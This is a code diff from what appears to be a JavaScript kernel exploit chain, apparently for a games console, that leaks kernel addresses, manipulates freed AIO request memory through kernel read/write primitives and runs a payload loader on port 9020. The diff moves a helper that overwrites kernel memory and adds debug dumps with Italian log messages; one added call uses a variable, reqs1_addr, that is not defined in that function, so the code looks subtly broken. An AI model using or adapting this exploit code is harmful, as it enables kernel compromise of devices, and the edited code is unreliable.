@@ -902,19 +902,11 @@ function leak_kernel_addrs(sd_pair) {
 
         free_aios(leak_ids_p, leak_ids_len);
 
-        log("test2_________");
-     debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Post-free AIO");
+   //     log("test2_________");
+   //  debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Post-free AIO");
 
-        
-function zero_out_memory(kmem, addr, size = 0x80) {
-    const zero_buf = new Buffer(size);
-    zero_buf.fill(0);
-    kmem.copyin(zero_buf.addr, addr, size);
-    log(`✅ Pulita memoria a ${addr} (${size} bytes)`);
-}
-        zero_out_memory(kmem, reqs1_addr);
 
-debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Post-free AIO");
+//debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Post-free AIO");
         
         log("test2_________");
     }
@@ -1697,6 +1689,15 @@ function runBinLoader() {
     log('BinLoader is ready. Send a payload to port 9020 now');
 }
 
+        
+function zero_out_memory(kmem, addr, size = 0x80) {
+    const zero_buf = new Buffer(size);
+    zero_buf.fill(0);
+    kmem.copyin(zero_buf.addr, addr, size);
+    log(`✅ Pulita memoria a ${addr} (${size} bytes)`);
+}
+    
+
 
 function debug_aio_memory_state(sd, kmem, addr, label = "AIO") {
     //log(`--- ${label} memory dump ---`);
@@ -1708,7 +1709,21 @@ function debug_aio_memory_state(sd, kmem, addr, label = "AIO") {
         hexdump(buf);
     } catch (e) {
         log(`Errore durante la lettura memoria AIO: ${e}`);
+        
     }
+
+
+        zero_out_memory(kmem, reqs1_addr);
+    log("________FREEE________");
+     try {
+        const buf = new Buffer(0x80);
+        kmem.copyout(addr, buf.addr, buf.size);
+        hexdump(buf);
+    } catch (e) {
+        log(`Errore durante la lettura memoria AIO: ${e}`);
+        
+    }
+    
    log('___________________TEST___________________________________');
     
 }
